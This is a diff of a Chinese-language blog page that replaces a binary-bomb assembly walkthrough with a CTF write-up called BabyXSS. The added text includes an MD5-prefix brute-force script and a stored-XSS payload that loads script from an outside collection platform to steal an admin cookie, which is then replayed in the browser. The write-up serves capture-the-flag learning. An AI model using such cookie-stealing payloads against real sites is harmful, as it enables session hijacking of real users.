@@ -103,28 +103,31 @@
 
 
 
-  <meta name="description" content="&amp;emsp;&amp;emsp;继续拆炸弹、、、昨天晚上又加班看了看汇编的指令集，对汇编语言有了个大概的了解，今天继续攻克试试。 phase_2汇编代码123456789101112131415161718192021222324252608048bb4 &amp;lt;phase_2&amp;gt;: 8048bb4:	53                   	push   %ebx 8048bb5:	83 ec 3">
-<meta name="keywords" content="逆向工程">
+  <meta name="description" content="&amp;emsp;&amp;emsp;感觉XSS攻击和SQL注入有异曲同工之妙~ &amp;emsp;&amp;emsp;直接访问admin.php会提示没有admin权限：第一反应是获取标志admin的cookie，然后修改本地的cookie，刷新页面，以此来获取flag。">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="201号challenge:二进制炸弹02">
-<meta property="og:url" content="http://yoursite.com/2019/04/14/201号challenge-二进制炸弹02/index.html">
+<meta property="og:title" content="BabyXSS">
+<meta property="og:url" content="http://yoursite.com/2019/05/12/BabyXSS/index.html">
 <meta property="og:site_name" content="DreamFly">
-<meta property="og:description" content="&amp;emsp;&amp;emsp;继续拆炸弹、、、昨天晚上又加班看了看汇编的指令集，对汇编语言有了个大概的了解，今天继续攻克试试。 phase_2汇编代码123456789101112131415161718192021222324252608048bb4 &amp;lt;phase_2&amp;gt;: 8048bb4:	53                   	push   %ebx 8048bb5:	83 ec 3">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;感觉XSS攻击和SQL注入有异曲同工之妙~ &amp;emsp;&amp;emsp;直接访问admin.php会提示没有admin权限：第一反应是获取标志admin的cookie，然后修改本地的cookie，刷新页面，以此来获取flag。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images/201/b3.png">
-<meta property="og:image" content="http://yoursite.com/images/201/b4.png">
-<meta property="og:updated_time" content="2019-04-15T02:27:34.797Z">
+<meta property="og:image" content="http://yoursite.com/images/BabyXSS/noflag.png">
+<meta property="og:image" content="http://yoursite.com/images/BabyXSS/xss.png">
+<meta property="og:image" content="http://yoursite.com/images/BabyXSS/edit.png">
+<meta property="og:image" content="http://yoursite.com/images/BabyXSS/token.png">
+<meta property="og:image" content="http://yoursite.com/images/BabyXSS/flag.png">
+<meta property="og:updated_time" content="2019-05-20T10:50:48.527Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="201号challenge:二进制炸弹02">
-<meta name="twitter:description" content="&amp;emsp;&amp;emsp;继续拆炸弹、、、昨天晚上又加班看了看汇编的指令集，对汇编语言有了个大概的了解，今天继续攻克试试。 phase_2汇编代码123456789101112131415161718192021222324252608048bb4 &amp;lt;phase_2&amp;gt;: 8048bb4:	53                   	push   %ebx 8048bb5:	83 ec 3">
-<meta name="twitter:image" content="http://yoursite.com/images/201/b3.png">
+<meta name="twitter:title" content="BabyXSS">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;感觉XSS攻击和SQL注入有异曲同工之妙~ &amp;emsp;&amp;emsp;直接访问admin.php会提示没有admin权限：第一反应是获取标志admin的cookie，然后修改本地的cookie，刷新页面，以此来获取flag。">
+<meta name="twitter:image" content="http://yoursite.com/images/BabyXSS/noflag.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/14/201号challenge-二进制炸弹02/">
+  <link rel="canonical" href="http://yoursite.com/2019/05/12/BabyXSS/">
 
 
 
@@ -134,7 +137,7 @@
   };
 </script>
 
-  <title>201号challenge:二进制炸弹02 | DreamFly</title>
+  <title>BabyXSS | DreamFly</title>
   
 
 
@@ -364,7 +367,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/14/201号challenge-二进制炸弹02/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/12/BabyXSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wenbo Lee">
@@ -381,7 +384,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">201号challenge:二进制炸弹02
+          <h1 class="post-title" itemprop="name headline">BabyXSS
 
               
             
@@ -407,7 +410,7 @@
                 
               
 
-              <time title="创建时间：2019-04-14 09:14:20" itemprop="dateCreated datePublished" datetime="2019-04-14T09:14:20+08:00">2019-04-14</time>
+              <time title="创建时间：2019-05-12 12:19:33" itemprop="dateCreated datePublished" datetime="2019-05-12T12:19:33+08:00">2019-05-12</time>
             
 
             
@@ -424,7 +427,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-04-15 10:27:34" itemprop="dateModified" datetime="2019-04-15T10:27:34+08:00">2019-04-15</time>
+                <time title="修改时间：2019-05-20 18:50:48" itemprop="dateModified" datetime="2019-05-20T18:50:48+08:00">2019-05-20</time>
               
             
           </span>
@@ -464,61 +467,27 @@
       
 
       
-        <p>&emsp;&emsp;继续拆炸弹、、、昨天晚上又加班看了看汇编的指令集，对汇编语言有了个大概的了解，今天继续攻克试试。</p>
-<h4 id="phase-2汇编代码"><a href="#phase-2汇编代码" class="headerlink" title="phase_2汇编代码"></a>phase_2汇编代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048bb4 &lt;phase_2&gt;:</span><br><span class="line"> 8048bb4:	53                   	push   %ebx</span><br><span class="line"> 8048bb5:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048bb8:	8d 44 24 18          	lea    0x18(%esp),%eax</span><br><span class="line"> 8048bbc:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 8048bc0:	8b 44 24 40          	mov    0x40(%esp),%eax</span><br><span class="line"> 8048bc4:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048bc7:	e8 70 05 00 00       	call   804913c&lt;read_six_numbers&gt; //读入6个数</span><br><span class="line"> 8048bcc:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)</span><br><span class="line"> 8048bd1:	79 22                	jns    8048bf5 &lt;phase_2+0x41&gt; //0x18(%esp)不是负数</span><br><span class="line"> 8048bd3:	e8 3d 05 00 00       	call   8049115 &lt;explode_bomb&gt;</span><br><span class="line"> 8048bd8:	eb 1b                	jmp    8048bf5 &lt;phase_2+0x41&gt;</span><br><span class="line"> 8048bda:	89 d8                	mov    %ebx,%eax //这应该是进入循环的点</span><br><span class="line"> 8048bdc:	03 44 9c 14          	add    0x14(%esp,%ebx,4),%eax //求%esp+4*%ebx+0x14中的值与%eax中值的和 放入%eax</span><br><span class="line"> 8048be0:	39 44 9c 18          	cmp    %eax,0x18(%esp,%ebx,4) //%eax与%esp+4*%ebx+0x18比较 注意0x14(%esp,%ebx,4)与0x18(%esp,%ebx,4)相差4个字节 应该是相邻的整数</span><br><span class="line"> 8048be4:	74 05                	je     8048beb &lt;phase_2+0x37&gt; //要想不爆炸 必须相等才行</span><br><span class="line"> 8048be6:	e8 2a 05 00 00       	call   8049115 &lt;explode_bomb&gt;</span><br><span class="line"> 8048beb:	83 c3 01             	add    $0x1,%ebx //%ebx值加一</span><br><span class="line"> 8048bee:	83 fb 06             	cmp    $0x6,%ebx //为6跳则出循环 猜想循环和6个数有关</span><br><span class="line"> 8048bf1:	75 e7                	jne    8048bda &lt;phase_2+0x26&gt;</span><br><span class="line"> 8048bf3:	eb 07                	jmp    8048bfc &lt;phase_2+0x48&gt;</span><br><span class="line"> 8048bf5:	bb 01 00 00 00       	mov    $0x1,%ebx //非负数时跳转到这 %ebx赋值1</span><br><span class="line"> 8048bfa:	eb de                	jmp    8048bda &lt;phase_2+0x26&gt;</span><br><span class="line"> 8048bfc:	83 c4 38             	add    $0x38,%esp</span><br><span class="line"> 8048bff:	5b                   	pop    %ebx</span><br><span class="line"> 8048c00:	c3                   	ret</span><br></pre></td></tr></table></figure>
-<h4 id="phase-2汇编指令"><a href="#phase-2汇编指令" class="headerlink" title="phase_2汇编指令"></a>phase_2汇编指令</h4><p>&emsp;&emsp;在phase_1整理过得这里不再列出，等做完再系统性的整理一下。</p>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>push</td>
-<td>把字压入堆栈</td>
-</tr>
-<tr>
-<td>lea</td>
-<td>装入有效地址</td>
-</tr>
-<tr>
-<td>cmp</td>
-<td>比较，两操作数做减法运算</td>
-</tr>
-<tr>
-<td>jns</td>
-<td>符号位为“0”时转移，即不是负数时跳转</td>
-</tr>
-<tr>
-<td>jmp</td>
-<td>无条件转移</td>
-</tr>
-<tr>
-<td>jne</td>
-<td>不等于时转移</td>
-</tr>
-<tr>
-<td>pop</td>
-<td>把字弹出堆栈</td>
-</tr>
-</tbody>
-</table>
-<h4 id="phase-2拆除"><a href="#phase-2拆除" class="headerlink" title="phase_2拆除"></a>phase_2拆除</h4><p>&emsp;&emsp;任务书中提到，phase2是关于循环，重点看一看地址跳转的部分，特别是往后调走循环和跳出循环的指令，确定循环内执行的操作。经分析，若要不引爆炸弹，其循环方式与顺序应与下图一致（画的有点烂）：<br><img src="/images/201/b3.png" alt><br>所以需要使上述循环条件都成立，细细的分析一下循环部分的内容，因为我对汇编不熟悉，所以里面有些东西困扰了我好久，翻看了不少资料，趁现在来灵感了，抓紧记一下。以下分析按照不引爆炸弹的情况进行：</p>
-<ul>
-<li>0x18(%esp)与0比较</li>
-<li>%ebx赋值为1</li>
-<li>%eax=%ebx</li>
-<li>%eax=%esp+4*%ebx+0x14+%eax，因为%ebx=1，所以相当于%eax=0x18(%esp)+%eax</li>
-<li>%eax与%esp+4*%ebx+0x18比较，因为%ebx=1，所以相当于%eax与0x1c(%esp)比较</li>
-<li>%ebx++，此时%ebx=2小于6，继续循环。</li>
-<li>接下来的事情就和上面第二步往下类似了，就是%ebx和%eax在逐次加一，这也就出现了0x18(%esp)、0x1c(%esp)、0x20(%esp)···像极了遍历数组时的场景（应该就是吧~），%ebx为循环条件。</li>
+        <p>&emsp;&emsp;感觉XSS攻击和SQL注入有异曲同工之妙~</p>
+<p>&emsp;&emsp;直接访问admin.php会提示没有admin权限：<br><img src="/images/BabyXSS/noflag.png" alt><br>第一反应是获取标志admin的cookie，然后修改本地的cookie，刷新页面，以此来获取flag。</p>
+<a id="more"></a>
+<h3 id="MD5截断验证"><a href="#MD5截断验证" class="headerlink" title="MD5截断验证"></a>MD5截断验证</h3><p>&emsp;&emsp;要想提交，需要先把下面的md5截断验证搞定才行。根据提示，应该是将一个字符串进行md5加密，然后把加密后的字符串的0-6位和后面给定的字符串进行比较，如果相等，那么就可以进行提交。所以我们的任务是找到一个字符串，这个字符串经md5加密后的前6位能和界面中给出的字符串匹配。使用最粗暴的方法，穷举。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line">msg = <span class="string">'abcde'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    str1=msg+str(i)</span><br><span class="line">    md.update(str1.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    hashid = md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hashid.startswith(<span class="string">'616831'</span>):</span><br><span class="line">        print(str1,hashid)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;在任意字符串（此处取abcde）后拼接数字i，直到加密后的密文前6个字符能匹配上待匹配字符串”616831”为止，这个待匹配字符串是变化的，每一次刷新都不一样。</p>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><ul>
+<li><p>在”Leave a message”处应该是xss代码植入点，在XSS平台<code>http://xss.tf</code> 注册登录并创建一个项目，平台中已经提供了需要插入的代码<code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xss.tf/qgI&gt;&lt;/sCrIpT&gt;</code> </p>
+</li>
+<li><p>将代码粘贴到message输入框中提交，然后点击并跳转到admin.php页面。</p>
+</li>
+<li><p>在xss平台中，查看接收到的内容，内有cookie：<br><img src="/images/BabyXSS/xss.png" alt><br>那么获取cookie这一步算是完成了，接下来要将cookie写到本地，然后再访问admin.php尝试。</p>
+</li>
+<li><p>经查阅资料，了解到谷歌浏览器装扩展程序EditThisCookie可以实现增删改本地cookie的功能。在谷歌的网上应用店中可以搜索安装，安装成功，会在浏览器的右上角出现一个曲奇饼干(应该是曲奇)的标志。</p>
+<p><img src="/images/BabyXSS/edit.png" alt></p>
+</li>
+<li><p>admin.php页面，在改动前还是提示”Your token in cookie shows that you are not admin, no flag.”，将浏览器的缓存清一下，然后打开EditThisCookie，添加cookie，名称为token，值为xss平台中获取的cookie值。<br><img src="/images/BabyXSS/token.png" alt></p>
+</li>
+<li><p>刷新界面，成功得到flag。<br><img src="/images/BabyXSS/flag.png" alt></p>
+</li>
 </ul>
-<p>&emsp;&emsp;综上，这6个数要满足，第一个数是非负数，第n个数加n等于第n+1个数的值。</p>
-<p>尝试写代码还原了一下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[]= &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>&#125;;<span class="comment">//下标从1开始 忽略0处数值</span></span><br><span class="line">    <span class="keyword">int</span> eax,ebx;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]&lt;<span class="number">0</span>) flag=<span class="number">1</span>;<span class="comment">//此处应当执行爆炸函数</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ebx=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            eax=ebx;</span><br><span class="line">            eax=eax+a[ebx];</span><br><span class="line">            <span class="keyword">if</span>(eax==a[ebx+<span class="number">1</span>]) ebx++;</span><br><span class="line">            <span class="keyword">else</span> flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(ebx&lt;<span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag) <span class="built_in">cout</span>&lt;&lt;<span class="string">"bomb..."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"success"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>将<code>0 1 3 6 10 15</code> 输入进去，结果正确。答案不唯一，只要符合规则就可以。</p>
-<p><img src="/images/201/b4.png" alt></p>
 
       
     </div>
@@ -559,7 +528,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/逆向工程/" rel="tag"><i class="fa fa-tag"></i> 逆向工程</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
           
         </div>
       
@@ -572,8 +541,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/13/201号challenge-二进制炸弹01/" rel="next" title="201号challenge:二进制炸弹01">
-                <i class="fa fa-chevron-left"></i> 201号challenge:二进制炸弹01
+              <a href="/2019/05/12/Basic-PHP-2/" rel="next" title="Basic_PHP_2">
+                <i class="fa fa-chevron-left"></i> Basic_PHP_2
               </a>
             
           </div>
@@ -582,8 +551,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/04/14/201号challenge-二进制炸弹03/" rel="prev" title="201号challenge:二进制炸弹03">
-                201号challenge:二进制炸弹03 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/05/12/Basic-SQL/" rel="prev" title="Basic_SQL">
+                Basic_SQL <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -762,7 +731,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-2汇编代码"><span class="nav-number">1.</span> <span class="nav-text">phase_2汇编代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-2汇编指令"><span class="nav-number">2.</span> <span class="nav-text">phase_2汇编指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-2拆除"><span class="nav-number">3.</span> <span class="nav-text">phase_2拆除</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5截断验证"><span class="nav-number">1.</span> <span class="nav-text">MD5截断验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤"><span class="nav-number">2.</span> <span class="nav-text">解题步骤</span></a></li></ol></div>
             
 
           </div>
@@ -1353,13 +1322,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/docs/variables.html
-      var isPost = '201号challenge:二进制炸弹02'.length > 0
+      var isPost = 'BabyXSS'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = '201号challenge:二进制炸弹02'
+        var title = 'BabyXSS'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
